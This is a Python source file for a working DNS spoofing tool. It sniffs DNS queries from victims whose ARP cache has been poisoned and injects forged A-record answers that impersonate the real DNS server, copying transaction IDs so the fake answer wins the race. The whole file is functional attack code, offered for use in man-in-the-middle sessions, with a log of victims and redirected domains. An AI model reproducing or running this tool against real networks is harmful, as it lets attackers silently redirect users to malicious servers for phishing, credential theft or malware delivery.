"""
dns_spoofer.py — Race-the-response DNS rewriting for active MITM sessions.

When the ARP attacker has poisoned a victim's ARP cache, the victim's DNS
queries flow through this machine. This module sniffs those queries and,
for domains matching user-supplied rules, immediately injects a forged
DNS response back at the victim from the spoofed source IP of the real
DNS server. Because we sit *on the path* and respond first, the legitimate
response that arrives later is ignored by the victim's resolver (the
transaction ID already matched the forged answer).

The spoofer is **purely additive** — packets continue to be forwarded by
the kernel as normal. We do not block or rewrite the real DNS response.
This makes the technique stable: if our spoofed reply is dropped, the
victim still gets DNS service from the real server.

Rules are evaluated by simple substring or wildcard match (``*.example.com``).
Two-argument constructor::

    spoofer = DNSSpoofer(
        iface="en0",
        rules=[
            ("example.com",     "10.0.0.1"),
            ("*.googleadservices.com", "0.0.0.0"),  # null-route ads
        ],
        target_ips=["10.0.0.55"],
    )
    spoofer.start()
    ...
    spoofer.stop()

Only A-record queries are spoofed (the most common). AAAA / CNAME / TXT
queries are forwarded normally. Stats are exposed via :attr:`hits` and
:attr:`recent_hits`.
"""

from __future__ import annotations

import collections
import fnmatch
import re
import threading
import time
from typing import Optional

try:
    from scapy.all import sniff, send  # type: ignore
    from scapy.layers.dns import DNS, DNSQR, DNSRR  # type: ignore
    from scapy.layers.inet import IP, UDP  # type: ignore

    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False


_IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")


def _matches_rule(qname: str, pattern: str) -> bool:
    """True if *qname* matches *pattern* (supports ``*`` wildcards)."""
    qname = qname.lower().rstrip(".")
    pattern = pattern.lower().strip().rstrip(".")
    if not pattern:
        return False
    if "*" in pattern or "?" in pattern:
        return fnmatch.fnmatchcase(qname, pattern)
    # Substring match — so "example.com" matches "ads.example.com" too.
    return pattern in qname or qname == pattern


class DNSSpoofer:
    """Race-the-response DNS spoofer driven by ``(pattern, ip)`` rules."""

    HIT_LIMIT = 500

    def __init__(
        self,
        iface: Optional[str],
        rules: list[tuple[str, str]],
        target_ips: Optional[list[str]] = None,
    ) -> None:
        self.iface = iface
        self.rules: list[tuple[str, str]] = []
        for pattern, ip in rules:
            pattern = (pattern or "").strip()
            ip = (ip or "").strip()
            if not pattern or not _IPV4_RE.match(ip):
                continue
            self.rules.append((pattern, ip))
        self.target_ips = set(t for t in (target_ips or []) if t)
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.hits: int = 0
        self.recent_hits: collections.deque = collections.deque(maxlen=self.HIT_LIMIT)
        self.started_at: float = 0.0

    # ------------------------------------------------------------------ #

    @property
    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    @property
    def uptime_seconds(self) -> float:
        return time.time() - self.started_at if self.started_at else 0.0

    def start(self) -> None:
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required for DNS spoofing.")
        if not self.rules:
            raise RuntimeError(
                "No spoof rules defined. Add at least one (pattern → IP) row."
            )
        if self.is_running:
            return
        self._stop_event.clear()
        self.started_at = time.time()
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None

    # ------------------------------------------------------------------ #

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "running":     self.is_running,
                "uptime":      self.uptime_seconds,
                "rules":       list(self.rules),
                "hits":        self.hits,
                "recent_hits": list(self.recent_hits),
            }

    # ------------------------------------------------------------------ #

    def _resolve(self, qname: str) -> Optional[str]:
        """Return the spoofed IP for *qname* if any rule matches."""
        for pattern, ip in self.rules:
            if _matches_rule(qname, pattern):
                return ip
        return None

    def _sniff_loop(self) -> None:
        # Filter: DNS queries (UDP destination port 53). Optionally restrict
        # to specific MITM'd source IPs when the caller supplied them.
        bpf_parts = ["udp port 53"]
        if self.target_ips:
            bpf_parts.append(
                "(" + " or ".join(f"src host {ip}" for ip in self.target_ips) + ")"
            )
        bpf = " and ".join(bpf_parts)
        try:
            sniff(
                iface=self.iface,
                filter=bpf,
                prn=self._on_packet,
                store=False,
                stop_filter=lambda _p: self._stop_event.is_set(),
            )
        except Exception:
            pass

    def _on_packet(self, packet) -> None:
        try:
            if not (packet.haslayer(DNS) and packet.haslayer(DNSQR)
                    and packet.haslayer(IP) and packet.haslayer(UDP)):
                return
            dns = packet[DNS]
            if dns.qr != 0:        # we only forge replies to queries
                return
            qd = packet[DNSQR]
            # qtype 1 = A. AAAA (28) and others are left alone.
            if int(qd.qtype) != 1:
                return
            raw = qd.qname
            qname = (
                raw.decode("utf-8", errors="replace")
                if isinstance(raw, bytes) else str(raw)
            ).rstrip(".")
            if not qname:
                return
            spoof_ip = self._resolve(qname)
            if not spoof_ip:
                return

            ipl = packet[IP]
            udpl = packet[UDP]
            # Craft the forged response: dst = victim, src = DNS server
            # (so the victim accepts it), copying the transaction ID
            # and full question section.
            response = (
                IP(src=ipl.dst, dst=ipl.src)
                / UDP(sport=udpl.dport, dport=udpl.sport)
                / DNS(
                    id=dns.id, qr=1, aa=1, qd=dns.qd,
                    an=DNSRR(rrname=qd.qname, ttl=60,
                             rdata=spoof_ip, type="A"),
                )
            )
            send(response, iface=self.iface, verbose=0)

            with self._lock:
                self.hits += 1
                self.recent_hits.append({
                    "ts":       time.time(),
                    "victim":   ipl.src,
                    "domain":   qname,
                    "spoof_ip": spoof_ip,
                })
        except Exception:
            pass
